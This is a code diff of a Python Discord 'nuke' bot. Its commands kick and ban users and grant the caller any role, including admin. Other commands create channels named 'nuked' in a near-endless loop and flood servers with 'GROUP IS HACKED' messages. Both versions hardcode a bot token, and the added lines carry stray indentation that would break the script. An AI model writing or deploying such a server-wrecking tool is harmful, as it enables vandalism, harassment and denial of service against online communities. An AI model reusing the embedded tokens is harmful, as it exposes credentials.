@@ -1,3 +1,4 @@
+
 import discord
 from discord.ext.commands import bot
 from discord.ext import commands
@@ -13,11 +14,11 @@ import sys
 import traceback
 import json
 from discord.utils import get
- 
- 
-bot = commands.Bot(command_prefix='!')
- 
-@bot.event
+
+
+ bot = commands.Bot(command_prefix='!')
+
+ @bot.event
 async def on_ready():
     print("BOT ACTIVATED!")
     print("Join my discord! https://discord.gg/tb6pa")
@@ -30,32 +31,33 @@ async def on_ready():
     print("!r : !r (role name) u can use this to give yourself admin")
     print("!c : channel spam")
     print('discord version: ' + discord.__version__)
- 
-@bot.command(pass_context = True)
+
+ @bot.command(pass_context = True)
 async def k(ctx, userName: discord.User):
     await bot.kick(userName)
- 
-@bot.command(pass_context = True)
+
+ @bot.command(pass_context = True)
 async def b(ctx, userName: discord.User):
     await bot.ban(userName)
- 
-@bot.command(pass_context=True)
+
+ @bot.command(pass_context=True)
 async def r(ctx, user: discord.User, role: discord.Role):
     await bot.add_roles(ctx.message.author, role)  
- 
-@bot.command(pass_context=True)
+
+ @bot.command(pass_context=True)
 async def c(ctx):
-    await bot.say("started hacking....") #idk ignore this just to make sure some people that this bot isnt dangerous
+    await bot.say("Started hacking....") #idk ignore this just to make sure some people that this bot isnt dangerous
     time.sleep(2)
     for i in range (0,10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000):
-        await bot.create_channel(ctx.message.server, 'LOL HACKED', type=discord.ChannelType.text) #you can change the channel name by replacing 'nuked' to any name
- 
-@bot.command(pass_context=True)
+        await bot.create_channel(ctx.message.server, 'nuked', type=discord.ChannelType.text) #you can change the channel name by replacing 'nuked' to any name
+
+ @bot.command(pass_context=True)
 async def s(ctx):
-     await bot.say("started hacking....") #idk ignore this just to make sure some people that this bot isnt dangerous
-     time.sleep(2)
+    await bot.say("Started hacking....") #idk ignore this just to make sure some people that this bot isnt dangerous
+    time.sleep(2)
     for i in range (0,10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000):
-        await bot.say("LOL GROUP IS HACKED") #text 1 goes here	
-        
- 
-bot.run ("NjIyMTIwMjU4OTYyMDYzMzgw.XXvQ7A.GWuDrVanrwRVD32ZpLMzI0c50Cc") #your bot token (please dont use your discord account token otherwise your account will get banned maybe)
+        await bot.say("LOL") #text 1 goes here
+        await bot.say("GROUP IS HACKED") #text 2 goes here
+
+
+ bot.run ("NjIyMTIwMjU4OTYyMDYzMzgw.XYEfng.jqLC_8wmcnQ8stivmiYRV6q_I3o") #your bot token (please dont use your discord account token otherwise your account will get banned maybe)
